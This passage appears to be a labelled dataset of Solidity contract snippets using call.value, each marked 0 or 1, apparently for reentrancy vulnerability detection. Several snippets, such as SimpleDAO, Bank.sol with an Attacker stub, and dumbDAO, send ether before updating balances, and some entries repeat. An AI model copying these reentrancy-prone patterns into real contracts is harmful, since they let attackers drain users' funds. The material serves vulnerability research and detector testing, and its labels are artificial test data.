contract_eth_value = this.balance;
require(sale.call.value(contract_eth_value)());
0
---------------------------------
1458 28687.sol
28687.sol
function CashOut(uint _am)  {
if(_am<=balances[msg.sender]) {
if(msg.sender.call.value(_am)()) {
balances[msg.sender]-=_am;
TransferLog.AddMessage(msg.sender,_am,"CashOut");
function() public payable{}
contract Log
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1459 1430.sol
1430.sol
function callContract(address to, bytes data) onlyOwner public payable returns (bool) {
require(to.call.value(msg.value)(data));
return true;
0
---------------------------------
1460 23088.sol
23088.sol
function atomicize (address[] addrs, uint[] values, uint[] calldataLengths, bytes calldatas) public{
require(addrs.length == values.length && addrs.length == calldataLengths.length);
uint j = 0;
for (uint i = 0; i < addrs.length; i++) {
bytes memory calldata = new bytes(calldataLengths[i]);
for (uint k = 0; k < calldataLengths[i]; k++) {
calldata[k] = calldatas[j];
j++;
require(addrs[i].call.value(values[i])(calldata));
1
---------------------------------
1461 Reentrance_02.sol
Reentrance_02.sol
function withdraw(uint _amount) public {
if(balances[msg.sender] >= _amount) {
if(msg.sender.call.value(_amount)()) {
_amount;
balances[msg.sender] -= _amount;
function() public payable {}
1
---------------------------------
1462 26523.sol
26523.sol
function claim_reward(uint uid, bytes32 passcode) public payable{
require(msg.value >= parameters["price"]);
require(is_passcode_correct(uid, passcode));
uint final_reward = get_reward(uid) + msg.value;
if (final_reward > parameters["price_poοl"])
final_reward = parameters["price_poοl"];
require(msg.sender.call.value(final_reward)());
parameters["price_poοl"] -= final_reward;
if (uid + 1 < users.length)
users[uid] = users[users.length - 1];
users.length -= 1;
1
---------------------------------
1463 SimpleDAO.sol
SimpleDAO.sol
function withdraw(uint amount) {
if (credit[msg.sender]>= amount) {
msg.sender.call.value(amount)();
credit[msg.sender]-=amount;
1
---------------------------------
1464 21241.sol
21241.sol
function finish() onlyOwner saleCompletedSuccessfully public {
uint256 freeEthers = address(this).balance * 40 / 100;
uint256 vestedEthers = address(this).balance - freeEthers;
address(0xd1B10607921C78D9a00529294C4b99f1bd250E1c).transfer(freeEthers);
assert(address(0x0285d35508e1A1f833142EB5211adb858Bd3323A).call.value(vestedEthers)());
AuctusToken token = AuctusToken(auctusTokenAddress);
token.setTokenSaleFinished();
if (remainingTokens > 0) {
token.burn(remainingTokens);
remainingTokens = 0;
0
---------------------------------
1465 39817.sol
39817.sol
function callDividend(address token_) owned {
assert(tokenManage[token_].hasDividend);
assert(tokenManage[token_].divContractAddress.call.value(0)(tokenManage[token_].divData));
function buyEther(uint256 amount) {
assert(valueToToken(etherContract,balances[msg.sender]) >= amount);
assert(destroyValue(msg.sender, tokenToValue(etherContract,amount)));
assert(msg.sender.call.value(amount)());
Buy(etherContract, msg.sender, amount, balances[msg.sender]);
function quickTrade(address tokenFrom, address tokenTo, uint256 input) payable drainBlock {
uint256 inValue;
uint256 tempInValue = safeAdd(tokenToValue(etherContract,msg.value),
tokenToValue(tokenFrom,input));
inValue = valueWithFee(tempInValue);
uint256 outValue = valueToToken(tokenTo,inValue);
assert(verifiedTransferFrom(tokenFrom,msg.sender,input));
if (tokenTo == etherContract){
assert(msg.sender.call.value(outValue)());
} else assert(Token(tokenTo).transfer(msg.sender, outValue));
Trade(tokenFrom, tokenTo, msg.sender, inValue);
function takeEtherProfits(){
ShopKeeper(shopKeeperLocation).splitProfits();
ValueTrader shop = ValueTrader(shopLocation);
shop.buyEther(shop.balanceOf(this));
assert(profitContainerLocation.call.value(this.balance)());
0
---------------------------------
1466 9920.sol
9920.sol
function tryExec(address target, bytes calldata, uint value) internal returns (bool call_ret){
return target.call.value(value)(calldata);
function exec(address target, bytes calldata, uint value) internal {
if(!tryExec(target, calldata, value)) {
throw;
function tryExec( address t, bytes c ) internal returns (bool) {
return tryExec(t, c, 0);
function tryExec( address t, uint256 v ) internal returns (bool) {
bytes memory c; return tryExec(t, c, v);
contract DSMath {
0
---------------------------------
1467 32605.sol
32605.sol
function forward(address destination, uint value, bytes data) public onlyOwner {
require(destination.call.value(value)(data));
Forwarded(destination, value, data);
contract MetaIdentityManager {
uint adminTimeLock;
uint userTimeLock;
uint adminRate;
address relay;
event LogIdentityCreated(
address indexed identity,
address indexed creator,
address owner,
address indexed recoveryKey);
event LogOwnerAdded(
address indexed identity,
address indexed owner,
address instigator);
event LogOwnerRemoved(
address indexed identity,
address indexed owner,
address instigator);
event LogRecoveryChanged(
address indexed identity,
address indexed recoveryKey,
address instigator);
event LogMigrationInitiated(
address indexed identity,
address indexed newIdManager,
address instigator);
event LogMigrationCanceled(
address indexed identity,
address indexed newIdManager,
address instigator);
event LogMigrationFinalized(
address indexed identity,
address indexed newIdManager,
address instigator);
mapping(address => mapping(address => uint)) owners;
mapping(address => address) recoveryKeys;
mapping(address => mapping(address => uint)) limiter;
mapping(address => uint) public migrationInitiated;
mapping(address => address) public migrationNewAddress;
modifier onlyAuthorized() {
require(msg.sender == relay || checkMessageData(msg.sender));
_;
modifier onlyOwner(address identity, address sender) {
require(isOwner(identity, sender));
_;
modifier onlyOlderOwner(address identity, address sender) {
require(isOlderOwner(identity, sender));
_;
modifier onlyRecovery(address identity, address sender) {
require(recoveryKeys[identity] == sender);
_;
modifier rateLimited(Proxy identity, address sender) {
require(limiter[identity][sender] < (now - adminRate));
limiter[identity][sender] = now;
_;
modifier validAddress(address addr) {
require(addr != address(0));
_;
function createIdentityWithCall(address owner, address recoveryKey, address destination, bytes data) public validAddress(recoveryKey) {
Proxy identity = new Proxy();
owners[identity][owner] = now - adminTimeLock;
recoveryKeys[identity] = recoveryKey;
LogIdentityCreated(identity, msg.sender, owner,  recoveryKey);
identity.forward(destination, 0, data);
function forwardTo(address sender, Proxy identity, address destination, uint value, bytes data) public onlyAuthorized onlyOwner(identity, sender){
identity.forward(destination, value, data);
0
---------------------------------
1468 22416.sol
22416.sol
function WithdrawToHolder(address _addr, uint _wei) public onlyOwner payable {
if(Holders[_addr]>0)  {
if(_addr.call.value(_wei)()){
Holders[_addr]-=_wei;
0
---------------------------------
1469 40090.sol
40090.sol
function multiAccessCallD(address _to, uint _value, bytes _data, address _sender) external onlyDelegate(_sender) onlymanyowners(_sender, sha3(msg.sig, _to, _value, _data)) returns(bool) {
return _to.call.value(_value)(_data);
function() returns(bool) {
return multiAccessCall(multiAccessRecipient, msg.value, msg.data);
function multiAccessCall(address _to, uint _value, bytes _data) returns(bool) {
return this.multiAccessCallD(_to, _value, _data, msg.sender);
0
---------------------------------
1470 Bank.sol
Bank.sol
function withdraw(){
require(msg.sender.call.value(balances[msg.sender])());
balances[msg.sender]=0;
contract Attacker{
address public bankAddr;
uint attackCount = 0;
constructor(address _bank){
bankAddr = _bank;
1
---------------------------------
1471 dumbDAO.sol
dumbDAO.sol
function withdraw(address _recipient) returns (bool) {
if (balances[msg.sender] == 0){
InsufficientFunds(balances[msg.sender],balances[msg.sender]);
throw;
PaymentCalled(_recipient, balances[msg.sender]);
if (_recipient.call.value(balances[msg.sender])()) {
balances[msg.sender] = 0;
return true;
1
---------------------------------
1472 8342.sol
8342.sol
function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyCommittee returns (bool) {
return _to.call.value(_value).gas(_gas)(_code);
0
---------------------------------
1473 31912.sol
31912.sol
function serveTx(WalletData storage self,  address _to, uint256 _value,  bytes _txData,  bool _confirm,    bytes _data)  public returns (bool,bytes32)  {
bytes32 _id = keccak256("serveTx",_to,_value,_txData);
uint256 _txIndex = self.transactionInfo[_id].length;
uint256 _required = self.requiredMajor;
if(msg.sender != address(this)){
bool allGood;
uint256 _amount;
if(!_confirm) {
allGood = revokeConfirm(self, _id);
return (allGood,_id);
} else {
if(_to != 0)
(allGood,_amount) = getAmount(_txData);
if(_txIndex == 0 || self.transactionInfo[_id][_txIndex - 1].success){
require(self.ownerIndex[msg.sender] > 0);
_required = getRequired(self, _to, _value, allGood,_amount);
self.transactionInfo[_id].length++;
self.transactionInfo[_id][_txIndex].confirmRequired = _required;
self.transactionInfo[_id][_txIndex].day = now / 1 days;
self.transactions[now / 1 days].push(_id);
} else {
_txIndex--;
allGood = checkNotConfirmed(self, _id, _txIndex);
if(!allGood)
return (false,_id);
self.transactionInfo[_id][_txIndex].confirmedOwners.push(uint256(msg.sender));
self.transactionInfo[_id][_txIndex].confirmCount++;
} else {
_txIndex--;
if(self.transactionInfo[_id][_txIndex].confirmCount ==  self.transactionInfo[_id][_txIndex].confirmRequired) {
self.currentSpend[0][1] += _value;
self.currentSpend[_to][1] += _amount;
self.transactionInfo[_id][_txIndex].success = true;
if(_to == 0){
createContract(_txData, _value);
} else {
require(_to.call.value(_value)(_txData));
delete self.transactionInfo[_id][_txIndex].data;
LogTransactionComplete(_id, _to, _value, _data);
} else {
if(self.transactionInfo[_id][_txIndex].data.length == 0)
self.transactionInfo[_id][_txIndex].data = _data;
uint256 confirmsNeeded = calcConfirmsNeeded(self.transactionInfo[_id][_txIndex].confirmRequired, self.transactionInfo[_id][_txIndex].confirmCount);
LogTransactionConfirmed(_id, msg.sender, confirmsNeeded);
return (true,_id);
0
---------------------------------
1474 17043.sol
17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
1475 18170.sol
18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
1476 40469.sol
40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
1477 33450.sol
33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
1478 14945.sol
14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
1479 4591.sol
4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
1480 17043.sol
17043.sol
function withdraw() public {
msg.sender.call.value(balances[msg.sender])();
balances[msg.sender] = 0;
1
---------------------------------
1481 18170.sol
18170.sol
function mintETHRewards( address _contract, uint256 _amount ) public onlyManager() {
require(_amount <= wingsETHRewards);
require(_contract.call.value(_amount)());
wingsETHRewards -= _amount;
0
---------------------------------
1482 40469.sol
40469.sol
function _forward(address _to, bytes _data) internal returns(bool) {
uint startGas = msg.gas + forwardCallGas + (_data.length * 50);
if (_to == 0x0) {
return false;
_to.call.value(msg.value)(_data);
return _applyRefund(startGas);
0
---------------------------------
1483 33450.sol
33450.sol
function executeTransaction(bytes32 TransHash) public notExecuted(TransHash){
if (isConfirmed(TransHash)) {
Transactions[TransHash].executed = true;
require(Transactions[TransHash].destination.call.value(Transactions[TransHash].value)(Transactions[TransHash].data));
Execution(TransHash);
function confirmTransaction(bytes32 TransHash) public onlyOwner(){
addConfirmation(TransHash);
executeTransaction(TransHash);
0
---------------------------------
1484 14945.sol
14945.sol
function approveAndCall(address _spender, uint256 _value, bytes _data) public payable returns (bool) {
require(_spender != address(this));
super.approve(_spender, _value);
require(_spender.call.value(msg.value)(_data));
return true;
1
---------------------------------
1485 4591.sol
4591.sol
function finishDistribution() onlyOwner canDistr public returns (bool) {
crowdsaleClosed = true;
uint256 amount = tokenReward.sub(amountRaisedIsc);
balances[beneficiary] = balances[beneficiary].add(amount);
emit Transfer(address(0), beneficiary, amount);
require(msg.sender.call.value(amountRaised)());
return true;
0
---------------------------------
1486 40092.sol
40092.sol
function withdrawPayments() external  returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
1487 simple_dao.sol
simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
1488 1403.sol
1403.sol
function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer( msg.sender, to, value, empty );
return true;
function transferFrom( address from, address to, uint256 value ) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer(msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1489 21900.sol
21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
1490 40092.sol
40092.sol
function withdrawPayments() external  returns (bool success) {
uint256 payment = payments[msg.sender];
payments[msg.sender] = 0;
totalBalance -= payment;
if (!msg.sender.call.value(payment)()) { throw; }
success = true;
0
---------------------------------
1491 simple_dao.sol
simple_dao.sol
function withdraw(uint amount) public{
if (credit[msg.sender]>= amount) {
require(msg.sender.call.value(amount)());
credit[msg.sender]-=amount;
1
---------------------------------
1492 1403.sol
1403.sol
function transfer( address to,   uint value,  bytes data, string custom_fallback ) public returns (bool success)  {
_transfer( msg.sender, to, value, data );
if ( isContract(to) ) {
ContractReceiver rx = ContractReceiver( to );
require(address(rx).call.value(0)(bytes4(keccak256(custom_fallback)), msg.sender, value, data) );
return true;
function transfer(address to, uint256 value) public returns (bool success) {
bytes memory empty;
_transfer( msg.sender, to, value, empty );
return true;
function transferFrom( address from, address to, uint256 value ) public returns (bool success) {
require( value <= allowances_[from][msg.sender] );
allowances_[from][msg.sender] -= value;
bytes memory empty;
_transfer( from, to, value, empty );
return true;
function transfer( address to, uint value, bytes data ) public returns (bool success) {
if (isContract(to)) {
return transferToContract( to, value, data );
_transfer(msg.sender, to, value, data );
return true;
function transferToContract( address to, uint value, bytes data ) private returns (bool success) {
_transfer(msg.sender, to, value, data );
ContractReceiver rx = ContractReceiver(to);
rx.tokenFallback( msg.sender, value, data );
return true;
1
---------------------------------
1493 21900.sol
21900.sol
function crowdsale() public payable returns (bool) {
require(msg.value >= limit);
uint256 vv = msg.value;
uint256 coin = crowdsalePrice.mul(vv);
require(coin.add(totalSupply) <= supplyLimit);
require(crowdsaleSupply.add(coin) <= crowdsaleTotal);
balances[msg.sender] = coin.add(balances[msg.sender]);
totalSupply = totalSupply.add(coin);
crowdsaleSupply = crowdsaleSupply.add(coin);
balances[msg.sender] = coin;
require(owner.call.value(msg.value)());
return true;
contract GGPCToken is Crowdsale {
string public name = "Global game payment currency";
string public symbol = "GGPC";
string public version = '1.0.2';
0
---------------------------------
1494 17518.sol
17518.sol
function sendTransaction(address to, uint256 value, bytes data) public onlyOwner returns (bool) {
return to.call.value(value)(data);
0
---------------------------------
1495 32559.sol
32559.sol
function transfer(address _to, uint256 _value, bytes _data, string _custom_fallback) onlyPayloadSize(4 * 32) public returns (bool success) {
if(isContract(_to)) {
require(Balances(balancesContract()).get(msg.sender) >= _value);
Balances(balancesContract()).transfer(msg.sender, _to, _value);
ContractReceiver receiver = ContractReceiver(_to);
require(receiver.call.value(0)(bytes4(keccak256(_custom_fallback)), msg.sender, _value, _data));
Transfer(msg.sender, _to, _value);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1496 40118.sol
40118.sol
function withdrawEtherOrThrow(uint256 amount) private {
if (msg.sender != owner) throw;
bool result = owner.call.value(amount)();
if (!result) { throw;}
function refund() noEther onlyOwner {
if (tokenBalance == 0) throw;
tokenBalance = 0;
withdrawEtherOrThrow(tokenBalance * tokenPrice);
0
---------------------------------
1497 cross-function-reentrancy.sol
cross-function-reentrancy.sol
function WithdrawReward(address recipient) public {
uint amountToWithdraw = rewardsForA[recipient];
rewardsForA[recipient] = 0;
require(recipient.call.value(amountToWithdraw)());
function GetFirstWithdrawalBonus(address recipient) public {
if (claimedBonus[recipient] == false) {
throw;
rewardsForA[recipient] += 100;
untrustedWithdrawReward(recipient);
claimedBonus[recipient] = true;
1
---------------------------------
1498 25196.sol
25196.sol
function getTokens(uint num, address tokenBuyerContract) public {
tokenBuyerContract.call.value(0 wei)();
1
---------------------------------
1499 27024.sol
27024.sol
function participate() payable onlyHuman {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if (luckyNumberOfAddress(msg.sender) == winnerLuckyNumber)  {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1500 simple_dao_fixed.sol
simple_dao_fixed.sol
function withdraw(uint amount) public {
if (credit[msg.sender]>= amount) {
credit[msg.sender]-=amount;
require(msg.sender.call.value(amount)());
0
---------------------------------
1501 35421.sol
35421.sol
function tryExec(address target, bytes calldata, uint256 value) mutex() internal  returns (bool call_ret){
return target.call.value(value)(calldata);
function exec( address target, bytes calldata, uint256 value) internal {
assert(tryExec(target, calldata, value));
contract canFreeze is owned {
bool public frozen=false;
modifier LockIfFrozen() {
if (!frozen){
_;
function ActionRetStatic(Trans _details, uint _TransID,uint128 _Price) 	internal {
uint128 _ETHReturned;
if(0==Risk.totalSupply()){_Price=lastPrice;}
_ETHReturned = wdiv(_details.amount , _Price);
if (Static.meltCoin(_details.holder,_details.amount)){
EventRedeemStatic(_details.holder,_details.amount ,_TransID, _Price);
if (wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Static.mintCoin(_details.holder,_details.amount);
EventCreateStatic(_details.holder,_details.amount ,_TransID, _Price);
if ( 0==this.balance) {
Bankrupt();
function ActionRetRisk(Trans _details, uint _TransID,uint128 _Price) internal {
uint128 _ETHReturned;
uint128 CurRiskPrice;
CurRiskPrice=RiskPrice(_Price);
if(CurRiskPrice>0){
_ETHReturned = wdiv( wmul(_details.amount , CurRiskPrice) , _Price);
if (Risk.meltCoin(_details.holder,_details.amount )){
EventRedeemRisk(_details.holder,_details.amount ,_TransID, _Price);
if ( wless(cast(this.balance),_ETHReturned)) {
_ETHReturned=cast(this.balance);
bytes memory calldata;
if (tryExec(_details.holder, calldata, _ETHReturned)) {
} else {
Risk.mintCoin(_details.holder,_details.amount);
EventCreateRisk(_details.holder,_details.amount ,_TransID, _Price);
}  else {
0
---------------------------------
1502 347.sol
347.sol
function _forwardFunds() internal {
bool isTransferDone = wallet.call.value(msg.value).gas(gasAmount)();
emit TokensTransfer (msg.sender, wallet, msg.value, isTransferDone);
0
---------------------------------
1503 3985.sol
3985.sol
function performFeelessTransaction(address sender, address target, bytes data, uint256 nonce, bytes sig) public payable {
require(this == target);
bytes memory prefix = "\x19Ethereum Signed Message:\n32";
bytes32 hash = keccak256(prefix, keccak256(target, data, nonce));
msgSender = ECRecovery.recover(hash, sig);
require(msgSender == sender);
require(nonces[msgSender]++ == nonce);
require(target.call.value(msg.value)(data));
msgSender = address(0);
0
---------------------------------
1504 39019.sol
39019.sol
function CreateTokens() {
if (tokensCreated > 0) return;
uint amount = amountRaised * (100 - rewardPercentage) / 100;
if (!tokenCreateContract.call.value(amount)(tokenCreateFunctionHash)) throw;
tokensCreated = tokenContract.balanceOf(this);
tokenCreator = msg.sender;
0
---------------------------------
1505 35637.sol
35637.sol
function transfer(address _to, uint48 _value, bytes _data, string _custom_fallback) returns (bool success) {
if(isContract(_to)) {
require(balanceOf(msg.sender) >= _value);
balances[msg.sender] = safeSub(balanceOf(msg.sender), _value);
balances[_to] = safeAdd(balanceOf(_to), _value);
ContractReceiver receiver = ContractReceiver(_to);
receiver.call.value(0)(bytes4(sha3(_custom_fallback)), msg.sender, _value, _data);
Transfer(msg.sender, _to, _value, _data);
return true;
} else {
return transferToAddress(_to, _value, _data);
0
---------------------------------
1506 28869.sol
28869.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId)  {
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public  ownerExists(msg.sender)  transactionExists(transactionId) notConfirmed(transactionId, msg.sender)  {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1507 18438.sol
18438.sol
function invest() public {
uint256 amountToSend = address(this).balance;
if(amountToSend > 1){
uint256 half = amountToSend / 2;
require(sk2xContract.call.value(half)());
p3dContract.buy.value(half)(msg.sender);
function donate() payable public {
require(sk2xContract.call.value(msg.value).gas(1000000)());
0
---------------------------------
1508 14758.sol
14758.sol
function wcf(address target, uint256 a) payable {
require(msg.sender == owner);
uint startBalance = this.balance;
target.call.value(msg.value)(bytes4(keccak256("play(uint256)")), a);
if (this.balance <= startBalance) revert();
owner.transfer(this.balance);
0
---------------------------------
1509 14994.sol
14994.sol
function collectOwedDividends() public returns (uint _amount) {
_updateCreditedPoints(msg.sender);
_amount = creditedPoints[msg.sender] / POINTS_PER_WEI;
creditedPoints[msg.sender] = 0;
dividendsCollected += _amount;
emit CollectedDividends(now, msg.sender, _amount);
require(msg.sender.call.value(_amount)());
0
---------------------------------
1510 35806.sol
35806.sol
function withdraw(uint amount) {
require(tokens[0][msg.sender] >= amount);
tokens[0][msg.sender] = safeSub(tokens[0][msg.sender], amount);
require(msg.sender.call.value(amount)());
Withdraw(0, msg.sender, amount, tokens[0][msg.sender]);
0
---------------------------------
1511 40241.sol
40241.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1512 21697.sol
21697.sol
function Jump() public payable  {
if(msg.value > 1 ether)  {
msg.sender.call.value(this.balance);
1
---------------------------------
1513 10107.sol
10107.sol
function transfer(address to, uint value, bytes data, string customFallback) public returns (bool) {
if(balanceOf(msg.sender) < value) revert();
balances[msg.sender] = balances[msg.sender].sub(value);
balances[to] = balances[to].add(value);
if (isContract(to)) {
assert(to.call.value(0)(bytes4(keccak256(customFallback)), msg.sender, value, data));
emit Transfer(msg.sender, to, value, data);
return true;
0
---------------------------------
1514 39191.sol
39191.sol
function withdraw(Bank storage self, address accountAddress, uint value) public returns (bool) {
if (self.accountBalances[accountAddress] >= value) {
deductFunds(self, accountAddress, value);
if (!accountAddress.send(value)) {
if (!accountAddress.call.value(value)()) {  throw; }
return true;
return false;
uint constant DEFAULT_SEND_GAS = 100000;
0
---------------------------------
1515 5515.sol
5515.sol
function executeTransaction(uint transactionId) public notExecuted(transactionId) {
if (isConfirmed(transactionId)) {
transactions[transactionId].executed = true;
if (transactions[transactionId].destination.call.value(transactions[transactionId].value)(transactions[transactionId].data)) {
emit Execution(transactionId);
} else {
emit ExecutionFailure(transactionId);
transactions[transactionId].executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
emit Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1516 17009.sol
17009.sol
function Pay(address _destination) public payable {
require(_destination != 0x0);
require(msg.value > 0);
require(!paused);
masterWallet.transfer(msg.value.div(9));
_destination.call.value(msg.value.div(9).mul(8))();
SettleFund(_destination, msg.value);
1
---------------------------------
1517 23421.sol
23421.sol
function _safeCall(address _to, uint _amount) internal {
require(_to != 0);
require(_to.call.value(_amount)());
function multiCall(address[] _address, uint[] _amount) payable public returns(bool) {
for (uint i = 0; i < _address.length; i++) {
_safeCall(_address[i], _amount[i]);
return true;
1
---------------------------------
1518 27486.sol
27486.sol
function Command(address adr,bytes data)  payable  public  {
require(msg.sender == Owner);
adr.call.value(msg.value)(data);
0
---------------------------------
1519 40353.sol
40353.sol
function withdraw(uint256 tokens) noEther onlyDaoChallenge {
if (tokens == 0 || tokenBalance == 0 || tokenBalance < tokens) throw;
tokenBalance -= tokens;
if(!owner.call.value(tokens * tokenPrice)()) throw;
function withdraw(uint256 tokens) noEther {
DaoAccount account = accountFor(msg.sender, false);
if (account == DaoAccount(0x00)) throw;
account.withdraw(tokens);
notifyWithdraw(msg.sender, tokens);
0
---------------------------------
1520 39684.sol
39684.sol
function () payable {
if (msg.data.length > 0) {
createSeries(msg.data, 0, "", "", 0x0);
} else if (latestSeriesForUser[msg.sender] != 0) {
if (latestSeriesForUser[msg.sender].call.value(msg.value)())
DepositMade(latestSeriesForUser[msg.sender], msg.value);
} else {
createSeries("", 0, "", "", 0x0);
contract SeriesFactory {
address public seriesFactory;
address public owner;
0
---------------------------------
1521 9611.sol
9611.sol
function doSafeSendWData(address toAddr, bytes data, uint amount) internal {
require(txMutex3847834 == false, "ss-guard");
txMutex3847834 = true;
require(toAddr.call.value(amount)(data), "ss-failed");
txMutex3847834 = false;
contract payoutAllC is safeSend {
address private _payTo;
event PayoutAll(address payTo, uint value);
constructor(address initPayTo) public {
assert(initPayTo != address(0));
_payTo = initPayTo;
function doSafeSend(address toAddr, uint amount) internal {
doSafeSendWData(toAddr, "", amount);
0
---------------------------------
1522 23387.sol
23387.sol
function executeTransaction(uint transactionId) public ownerExists(msg.sender) confirmed(transactionId, msg.sender)  notExecuted(transactionId){
if (isConfirmed(transactionId)) {
Transaction storage txn = transactions[transactionId];
txn.executed = true;
if (txn.destination.call.value(txn.value)(txn.data))
Execution(transactionId);
else {
ExecutionFailure(transactionId);
txn.executed = false;
function confirmTransaction(uint transactionId) public ownerExists(msg.sender) transactionExists(transactionId) notConfirmed(transactionId, msg.sender) {
confirmations[transactionId][msg.sender] = true;
Confirmation(msg.sender, transactionId);
executeTransaction(transactionId);
0
---------------------------------
1523 27334.sol
27334.sol
function participate() payable {
require(msg.value == 0.1 ether);
require(!participated[msg.sender]);
if ( luckyNumberOfAddress(msg.sender) == luckyNumber) {
participated[msg.sender] = true;
require(msg.sender.call.value(this.balance)());
0
---------------------------------
1524 39644.sol
39644.sol
function revoke(address transactor, address transactee) {
if (msg.sender != transactor && msg.sender != transactee) { throw; }
if(!verify(transactor, transactee)) { throw; }
uint32 deposit = _verifications[transactor][transactee];
delete _verifications[transactor][transactee];
if (!transactee.call.value(deposit).gas(23000)()) {  throw;  }
RevokeEvent(transactor, transactee, deposit);
0
---------------------------------
1525 36563.sol
36563.sol
function forward(address _destination, uint256 _value, bytes _data) onlyOwner {
require(_destination != address(0));
assert(_destination.call.value(_value)(_data));
if (_value > 0) {
Withdrawal(_destination, _value, _data);
function() payable {
Deposit(msg.sender, msg.value);
0
---------------------------------
1526 11719.sol
11719.sol
function Collect(uint _am) public payable {
if(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {
if(msg.sender.call.value(_am)())  {
balances[msg.sender]-=_am;
Log.AddMessage(msg.sender,_am,"Collect");
function() public payable {
Deposit();
contract LogFile
struct Message
address Sender;
string  Data;
uint Val;
uint  Time;
Message[] public History;
Message LastMsg;
1
---------------------------------
1527 24007.sol
24007.sol
function GetEther() public payable {
if(ExtractDepositTime[msg.sender]!=0 && ExtractDepositTime[msg.sender]<now) {
msg.sender.call.value(0.3 ether);
ExtractDepositTime[msg.sender] = 0;
1
---------------------------------
1528 1879.sol
1879.sol
function upgradeToAndCall(address newImplementation, bytes data) payable external ifAdmin {
_upgradeTo(newImplementation);
require(address(this).call.value(msg.value)(data));
0
---------------------------------
1529 39269.sol
39269.sol
function sendPending() public preventReentry isHolder(msg.sender) returns (bool){
if (ptxTail == ptxHead) return false;
TX memory tx = pendingTxs[ptxTail];
if(now < tx.timeLock) return false;
delete pendingTxs[ptxTail++];
if(!tx.blocked) {
if(tx.to.call.value(tx.value)(tx.data)) {
committedEther -= tx.value;
Withdrawal(tx.from, tx.to, tx.value);
return true;
if (tx.from == address(this)) {
committedEther -= tx.value;
} else {
holders[tx.from].etherBalance += tx.value;
TransactionFailed(tx.from, tx.to, tx.value);
return false;
0
---------------------------------
1530 10604.sol
10604.sol
